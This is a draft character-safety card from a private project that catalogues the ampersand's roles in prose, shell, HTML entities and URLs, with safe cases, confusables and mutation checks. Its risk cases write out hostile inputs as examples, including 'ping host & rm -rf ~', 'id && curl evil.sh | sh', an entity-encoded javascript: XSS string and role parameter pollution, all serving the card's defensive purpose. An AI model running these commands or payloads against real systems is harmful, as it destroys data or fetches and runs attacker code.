PRIVATE AUTHORED PROJECT / COMMERCIAL USE PROHIBITED

DOCUMENT_ID: SIGN_CORE_CARD_AMPERSAND_U0026_GEN3_v0_3_EN
DOCUMENT_TYPE: SIGN_CORE_CARD
TEMPLATE_LINE: GEN3_v0_3
DOCUMENT_STATUS: WORKING_DRAFT
STATUS: WORKING_DRAFT / NOT_LOCKED / NOT_RUNTIME / NOT_VALIDATOR / NOT_PRODUCTION / NOT_CONVEYOR_RUN
SOURCE_TEMPLATE: SIGN_CORE_CARD_TEMPLATE_GEN3_v0_3_EN
BASED_ON_RULESET: SIGN_CORE_CARD_CONVEYOR_RULES_GEN3_v0_3_EN
TRANSLATION_NOTE: English mirror of SIGN_CORE_CARD_AMPERSAND_U0026_GEN3_v0_3_RU (authoritative). Codepoints, field names and formulas identical. DRAFT for our work (Vakhter); conveyor is a separate project.

============================================================
0. UNIVERSALITY
============================================================
BOUND_TO_SPECIFIC_SIGN: YES
AFTER_USE_RESIDUE: FORBIDDEN
SIGN_DATA_IS_SESSION_ONLY: YES

============================================================
1. COMMON_CONVEYOR_DISCIPLINE
============================================================
CONVEYOR_DISCIPLINE_VERSION: v0_3
RUN_CARD_REQUIRED_BEFORE_LOCK: YES
LOCKED_WORKING_CORE_SELF_ASSIGNMENT: FORBIDDEN
MODEL_FAMILY_DIVERSITY_REQUIRED: YES
ADVERSARIAL_EVIDENCE_REQUIRED: YES
MUTATION_CHECK_REQUIRED: YES
LIMITATION_STATEMENT_REQUIRED: YES
AFTER_RUN_RESIDUE: FORBIDDEN
STATUS_PROGRESSION_TRACKER:
  WORKING_DRAFT: YES
  STRUCTURAL_PREFLIGHT_PASS: PENDING
  CONVEYOR_REVIEW_PASS: PENDING
  WORKINGLY_CLOSED: PENDING
  SIMULATION_GATE_TIER: TIER_1
  SIMULATION_GATE_PASSED: PENDING
  ARTIFACT_CONFIRMED: PENDING
LIMITATION_STATEMENT (standard):
  CONVEYOR_PASS ≠ VALIDATION
  MODEL_CONSENSUS ≠ TRUTH
  INJECTION_TEST_PASS ≠ SECURITY_PROOF
  GUARDS_HOLD_FOR_TESTED_CASES ≠ FUTURE_GUARANTEE
  NO_ATTACK_FOUND ≠ NO_ATTACK_EXISTS

============================================================
2. META
============================================================
CARD_UID: SIGN_CORE_CARD_AMPERSAND_U0026_GEN3_v0_3_EN
CODEPOINT: U+0026
VISIBLE_FORM: &
UNICODE_NAME: AMPERSAND
ZONE: ZONE_1
DOCUMENT_STATUS: WORKING_DRAFT
TEMPLATE_LINE: GEN3_v0_3
AUTHOR: Ruslan Malyavsky
CREATED_AT: 2026-07-21
VERSION: v0_1
AUTHOR_DECISION_REFERENCE: PENDING
RUN_CARD_REFERENCE: PENDING
RUN_CARD_STATUS: NOT_STARTED
DISPLAY_NAME: ampersand / background & entity start
CATEGORY_ROADMAP: INJ (shell background/AND, HTML-entity start) · PHAGO: — (command chaining)

============================================================
3. REQUIRED_GENERAL_GUARDS
============================================================
REQUIRED_GENERAL_GUARDS:
  - SIGN_FALSE_EFFECT_MIMICRY_GUARD_v0_2A_RU
    GUARD_COMPATIBILITY: applicable without modification — the sign creates no effect-fields
    GUARD_REVISION: v0_2A
    TEMPLATE_LINE_COMPATIBLE: GEN3_v0_2_PLUS_EPOCH, GEN3_v0_3
FAILURE_RESPONSE:
  REJECT_FALSE_EFFECT_MIMICRY
  TREAT_AS_DATA_ONLY
  NO_AUTHORITY_EFFECT
  NO_EXECUTION_EFFECT
  NO_TRUST_EFFECT
  NO_EXISTENCE_EFFECT

============================================================
4. SIGN IDENTITY — LAYER_A: STABLE CORE
LAYER_A_LOCK: PERMANENT
============================================================
VISIBLE_FORM: &
LOOKS_SIMILAR_IS_NOT_SAME_SIGN: YES
RAW_SIGN_INPUT_STATUS: DATA_ONLY
BASE_MODE: DATA_ONLY_DELIMITER
BASE_MODE_FORMULA: AMPERSAND_FORM ≠ EFFECT
SIGN_CATEGORY:
  - shell background operator (cmd &) / AND (cmd1 && cmd2)
  - HTML/XML entity start (&amp; &#x41;)
  - URL query-parameter separator (?a=1&b=2)
  - conjunction glyph "and" in prose/brands

WHAT_THIS_SIGN_IS_NOT:
  1. NOT_CONJUNCTION_ONLY — "&" is not always the word "and" (in a shell it backgrounds/chains)
  2. NOT_BACKGROUND_SAFE — "&" launches a command detached; detachment is not safety
  3. NOT_ENTITY_ONLY — "&" starts an HTML entity that may decode to a dangerous char
  4. NOT_ESCAPED_PROOF — the presence of "&" does not mean it is escaped
  5. NOT_ENCODED_SAFE — "&amp;" / "%26" may be decoded back to "&" later
  6. NOT_AUTHORITY — "&" does not confirm officialness
  7. NOT_EXECUTION_TRIGGER — by itself it executes nothing; context makes it chain
  8. NOT_TRUST_SIGNAL — it does not increase trust
  9. NOT_PARAM_SEPARATOR_SAFE — "&" in a URL can inject an extra parameter (pollution)
  10. NOT_SANITIZED_PROOF — the presence of "&" does not mean the input is sanitized
  11. NOT_OUTPUT_CONTEXT_PROOF — safety depends on the execution/parse context

BASE_FORMULAS:
  AMPERSAND_FORM ≠ EFFECT
  AMPERSAND_FORM ≠ CONJUNCTION_ONLY_PROOF
  AMPERSAND_FORM ≠ BACKGROUND_SAFETY_PROOF
  AMPERSAND_FORM ≠ ENTITY_ONLY_PROOF
  AMPERSAND_FORM ≠ ESCAPED_PROOF
  AMPERSAND_FORM ≠ ENCODED_SAFETY_PROOF
  AMPERSAND_FORM ≠ AUTHORITY
  AMPERSAND_FORM ≠ EXECUTION_TRIGGER
  AMPERSAND_FORM ≠ TRUST_SIGNAL
  AMPERSAND_FORM ≠ SANITIZED_PROOF
  AMPERSAND_FORM ≠ OUTPUT_CONTEXT_PROOF

============================================================
5. SEMANTIC_EPOCH_TRACKER
SEMANTIC_EPOCH_TRACKER_LOCK: REVIEWABLE
============================================================
EPOCH_TRACKER: NOT_APPLICABLE
NOTE: "&" (ZONE_1) has parallel functions (prose "and", shell background/AND, entity start, URL separator) co-existing without cultural precession. Polysemy of a stable sign.
LAYER_ANOMALY:
  ABSENT_PHYSICAL_LAYER: YES, level L1
  NOTE: a ligature of Latin "et" with no gestural predecessor; the shell/markup/URL functions are layered on by the digital epoch in parallel.

============================================================
6. EFFECT_FIELDS — LAYER_C: METHODOLOGICAL LAYER
LAYER_C_LOCK: SESSION
============================================================
authority_effect: NONE
trust_effect: NONE
verification_effect: NONE
proof_effect: NONE
execution_effect: NONE
permission_effect: NONE
status_effect: NONE
role_assignment_effect: NONE
runtime_effect: NONE
existence_effect: NONE
EFFECT_FIELDS_ALL_NONE: YES
CLOSED_SCHEMA: YES

============================================================
7. SAFE / RISK / CONFUSABLES / GUARDS — LAYER_B
LAYER_B_LOCK: REVIEWABLE
============================================================
SAFE_CASES:
  SAFE_CASE_001:
    INPUT: "Tom & Jerry"
    CONTEXT: "and" as a conjunction in prose
    EXPECTED: INFO
    RISK: NONE
    GUARD: AMPERSAND_FORM ≠ CONJUNCTION_ONLY_PROOF
  SAFE_CASE_002:
    INPUT: "Procter & Gamble"
    CONTEXT: an ampersand in a brand name
    EXPECTED: INFO
    RISK: NONE
    GUARD: AMPERSAND_FORM ≠ EFFECT
  SAFE_CASE_003:
    INPUT: "?page=1&sort=asc"
    CONTEXT: a normal URL query separator
    EXPECTED: INFO
    RISK: NONE
    GUARD: AMPERSAND_FORM ≠ PARAM_SEPARATOR_SAFE
  SAFE_CASE_004:
    INPUT: "&amp;"
    CONTEXT: a properly encoded HTML entity displayed as text
    EXPECTED: INFO
    RISK: NONE
    GUARD: AMPERSAND_FORM ≠ ENTITY_ONLY_PROOF
  SAFE_CASE_005:
    INPUT: "a && b (boolean and, as literal text)"
    CONTEXT: logical AND shown as text
    EXPECTED: INFO
    RISK: NONE
    GUARD: AMPERSAND_FORM ≠ EFFECT
  SAFE_CASE_006:
    INPUT: "R&D department"
    CONTEXT: an ampersand inside a common abbreviation
    EXPECTED: INFO
    RISK: NONE
    GUARD: AMPERSAND_FORM ≠ CONJUNCTION_ONLY_PROOF

RISK_CASES:
  RISK_CASE_001:
    NAME: SHELL_BACKGROUND_INJECTION
    INPUT: "ping host & rm -rf ~"
    CONTEXT: backgrounding one command and running a second
    RISK: CRITICAL
    ATTACK: "&" detaches the first command and immediately runs the attacker command
    GUARD: AMPERSAND_FORM ≠ BACKGROUND_SAFETY_PROOF
  RISK_CASE_002:
    NAME: SHELL_AND_CHAIN
    INPUT: "id && curl evil.sh | sh"
    CONTEXT: conditional AND-execution of a second command
    RISK: CRITICAL
    ATTACK: "&&" runs the second command if the first succeeds
    GUARD: AMPERSAND_FORM ≠ EFFECT
  RISK_CASE_003:
    NAME: HTML_ENTITY_XSS
    INPUT: "&#x6A;avascript:alert(1)"
    CONTEXT: a numeric entity decoding into a dangerous string
    RISK: HIGH
    ATTACK: "&#x6A;" decodes to "j" → forms "javascript:" after the check
    GUARD: AMPERSAND_FORM ≠ ENTITY_ONLY_PROOF
  RISK_CASE_004:
    NAME: PARAMETER_POLLUTION
    INPUT: "?role=user&role=admin"
    CONTEXT: HTTP parameter pollution via a duplicate key
    RISK: HIGH
    ATTACK: "&" injects a second "role" the backend may prefer (privilege change)
    GUARD: AMPERSAND_FORM ≠ PARAM_SEPARATOR_SAFE
  RISK_CASE_005:
    NAME: ENCODED_AMP_BYPASS
    INPUT: "cmd%26 rm -rf ~ (with a later decode)"
    CONTEXT: an encoded "&" decoded back before execution
    RISK: HIGH
    ATTACK: %26 decodes to "&" AFTER the check → backgrounds/chains
    GUARD: AMPERSAND_FORM ≠ ENCODED_SAFETY_PROOF
  RISK_CASE_006:
    NAME: FULLWIDTH_AMP_BYPASS
    INPUT: "cmd＆rm (fullwidth ＆ U+FF06)"
    CONTEXT: a look-alike to bypass an "&" filter
    RISK: MEDIUM
    ATTACK: a filter looks for ASCII "&", a normalizer may fold ＆ to "&"
    GUARD: AMPERSAND_FORM ≠ EFFECT

CONFUSABLES:
  CONFUSABLE_001:
    VISIBLE_FORM: ＆
    CODEPOINT: U+FF06
    NAME: FULLWIDTH AMPERSAND
    RISK: HIGH
    RULE: FULLWIDTH_AMPERSAND ≠ AMPERSAND (bypasses a filter looking for ASCII "&")
  CONFUSABLE_002:
    VISIBLE_FORM: ﹠
    CODEPOINT: U+FE60
    NAME: SMALL AMPERSAND
    RISK: MEDIUM
    RULE: SMALL_AMPERSAND ≠ AMPERSAND
  CONFUSABLE_003:
    VISIBLE_FORM: ⅋
    CODEPOINT: U+214B
    NAME: TURNED AMPERSAND
    RISK: LOW
    RULE: TURNED_AMPERSAND ≠ AMPERSAND
  CONFUSABLE_004:
    VISIBLE_FORM: ⁊
    CODEPOINT: U+204A
    NAME: TIRONIAN SIGN ET
    RISK: LOW
    RULE: TIRONIAN_ET ≠ AMPERSAND (historical "and" abbreviation, semantic look-alike)
  CONFUSABLE_005:
    VISIBLE_FORM: 🙰
    CODEPOINT: U+1F670
    NAME: SCRIPT LIGATURE ET ORNAMENT
    RISK: LOW
    RULE: SCRIPT_ET_LIGATURE ≠ AMPERSAND (decorative "et" ligature, same origin)

CONTRADICTION_GUARDS:
  CG1:
    TRIGGER: "'&' is always the word 'and'"
    RESPONSE: AMPERSAND_FORM ≠ CONJUNCTION_ONLY_PROOF
    RULE: in a shell "&" backgrounds/chains commands
  CG2:
    TRIGGER: "backgrounding a command is harmless"
    RESPONSE: AMPERSAND_FORM ≠ BACKGROUND_SAFETY_PROOF
    RULE: "&" runs a second command detached
  CG3:
    TRIGGER: "'&' only ever starts a safe HTML entity"
    RESPONSE: AMPERSAND_FORM ≠ ENTITY_ONLY_PROOF
    RULE: the entity may decode to a dangerous char (e.g. "j" in javascript:)
  CG4:
    TRIGGER: "'&amp;' / '%26' is safe forever"
    RESPONSE: AMPERSAND_FORM ≠ ENCODED_SAFETY_PROOF
    RULE: the encoded form may be decoded back to "&" before execution
  CG5:
    TRIGGER: "an ASCII '&' filter catches all ampersands"
    RESPONSE: AMPERSAND_FORM ≠ EFFECT
    RULE: fullwidth ＆ (U+FF06) is a different codepoint
  CG6:
    TRIGGER: "the presence of '&' means the input is sanitized"
    RESPONSE: AMPERSAND_FORM ≠ SANITIZED_PROOF
    RULE: the presence of the sign says nothing about sanitization

SEQUENCE_LAYER_BOUNDARY:
  SIGN_SAFE_ALONE ≠ SIGN_SAFE_IN_SEQUENCE: YES
  SEQUENCE_CANDIDATES:
    SC1:
      SEQUENCE: "& "
      NAME: SHELL_BACKGROUND
      RISK_LEVEL: CRITICAL
      POSSIBLE_CONTEXTS: backgrounding and running a second command
      REQUIRES_SEQUENCE_INTEGRATOR: YES
    SC2:
      SEQUENCE: "&&"
      NAME: SHELL_AND
      RISK_LEVEL: CRITICAL
      POSSIBLE_CONTEXTS: conditional AND-execution of a second command
      REQUIRES_SEQUENCE_INTEGRATOR: YES
    SC3:
      SEQUENCE: "&#x"
      NAME: HEX_ENTITY
      RISK_LEVEL: HIGH
      POSSIBLE_CONTEXTS: numeric/hex HTML entity decoding into a dangerous char
      REQUIRES_SEQUENCE_INTEGRATOR: YES
  IF NOT_APPLICABLE: not applicable — sequences with "&" are central to command/entity injection.

PHAGO_ENTITY_MIMICRY:
  NOT_APPLICABLE:
    REASON: "&" backgrounds/chains commands or starts an entity, but does not imitate the existence of a verified entity. Its risks are injection/decoding, not entity mimicry.
    REVIEW_REQUIRED: YES

============================================================
8. ADVERSARIAL_COVERAGE — RUN_CARD SEED
============================================================
MIN_TOTAL_VECTORS: 10 (5 categories A-E, CATEGORY_F NOT_APPLICABLE for ZONE_1)
CATEGORY_A: FORM_MANIPULATION (2)
  A1: substitution of ASCII "&" with fullwidth ＆ (U+FF06) to bypass a filter
  A2: substitution with small ﹠ (U+FE60)
CATEGORY_B: CONTEXT_INJECTION (2)
  B1: shell background ping host & rm -rf ~
  B2: HTTP parameter pollution ?role=user&role=admin
CATEGORY_C: SEQUENCE_MANIPULATION (2)
  C1: "&&" (SC2) — conditional AND-execution
  C2: "&#x" (SC3) — hex entity decode
CATEGORY_D: SEMANTIC_MIMICRY (2)
  D1: "&" presented as harmless "and" inside a command field
  D2: "&amp;" as "safe" encoded text with a later decode
CATEGORY_E: PHAGO_ENTITY_MIMICRY (2)
  E1: N/A — the sign is not a PHAGO carrier; vector: background-chain into an OS-command template
  E2: N/A — vector: numeric-entity decode into a dangerous scheme
CATEGORY_F: SEMANTIC_LAYER_MANIPULATION
  NOT_APPLICABLE
  REASON: ZONE_1, the sign has no dormant/active epochs.
ACTUAL_TOTAL_VECTORS: 10
COVERAGE_STATUS: SUFFICIENT (10 ≥ 10)

============================================================
9. MUTATION_CHECK
============================================================
MUTATION_01:
  CLAIM: "&" is always the word "and"
  EXPECTED: FAIL_CONJUNCTION_ONLY_MIMICRY
  RESULT: FAIL
MUTATION_02:
  CLAIM: backgrounding a command is harmless
  EXPECTED: FAIL_BACKGROUND_SAFETY_MIMICRY
  RESULT: FAIL
MUTATION_03:
  CLAIM: "&" only ever starts a safe HTML entity
  EXPECTED: FAIL_ENTITY_ONLY_MIMICRY
  RESULT: FAIL
MUTATION_04:
  CLAIM: "&amp;" / "%26" is safe forever
  EXPECTED: FAIL_ENCODED_SAFETY_MIMICRY
  RESULT: FAIL
MUTATION_05:
  CLAIM: an ASCII "&" filter catches all ampersand look-alikes
  EXPECTED: FAIL_CONFUSABLE_COVERAGE_MIMICRY
  RESULT: FAIL
MUTATION_06:
  CLAIM: the presence of "&" proves the input was sanitized
  EXPECTED: FAIL_SANITIZED_MIMICRY
  RESULT: FAIL

============================================================
10. KNOWN_OPEN_QUESTIONS
============================================================
OQ1:
  QUESTION: how to neutralize "&" per context (shell/HTML-entity/URL) without false positives on prose/brands/query strings?
  STATUS: CLOSED_AS_DELEGATED_TO_INTEGRATOR (argument-vector exec + entity-decode-then-validate + strict parameter parsing is an integrator/runtime concern)
  BLOCKS_WORKINGLY_CLOSED: NO
  NOTE: the card fixes the rule "the safety of '&' is decided by the execution/parse context".
ALL_OPEN_QUESTIONS_CLOSED: NO (delegated, non-blocking)

============================================================
11. PATCH_HISTORY
============================================================
PATCH_HISTORY:
  v0_1_PATCH_01: initial creation (Ruslan Malyavsky, 2026-07-21) — draft from the GEN3_v0_3 template (Vakhter); not conveyor-run.
PATCHES_APPLIED: 1
PATCHES_VERIFIED: 0/1

============================================================
12. LIMITATION_STATEMENT
============================================================
LIMITATION_STATEMENT:
  THIS_CARD IS A WORKING_DRAFT ARTIFACT (until ARTIFACT_CONFIRMED)
  NOT A FINAL_STANDARD
  NOT A PARSER
  NOT A RUNTIME
  NOT A SECURITY_CERTIFICATE
  NOT_CONVEYOR_RUN (draft for our work; conveyor is a separate project)
  CONVEYOR_PASS ≠ VALIDATION
  RUN_CARD_RESULT ≠ FINAL_STATUS
  WORKINGLY_CLOSED ≠ ARTIFACT_CONFIRMED

============================================================
13. INTEGRATION_INTERFACE_STATUS
============================================================
INTEGRATION_INTERFACE_STATUS:
  STATUS: READY_PENDING_CONCRETE_INTEGRATOR
  ATTACHED_INTEGRATOR_UID: NONE_CURRENTLY_ATTACHED
  ACTIVE_MODULES_COUNT: 0
  RUNTIME_ATTACHMENT: NONE
  PERMANENT_BINDING: NO
  SESSION_ONLY_BINDING: YES
  AFTER_RUN_RESIDUE: FORBIDDEN

============================================================
END_OF_DOCUMENT
